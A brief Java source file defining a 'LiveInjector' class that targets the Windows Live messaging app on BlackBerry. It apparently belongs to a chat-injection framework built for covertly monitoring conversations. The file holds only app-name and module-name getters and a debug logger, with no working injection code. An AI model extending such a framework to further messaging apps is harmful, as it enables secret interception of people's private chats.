package blackberry.injection.injectors;

import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.injectors.group.ChatGroupInjector;

public class LiveInjector extends ChatGroupInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("MicrosoftLiveInjector",
            DebugLevel.VERBOSE);


    
    //#endif
    public String getAppName() {
        return "Live";
    }


    public String getCodName() {
        // TODO Auto-generated method stub
        return "net_rim_bb_mslive";
    }



}
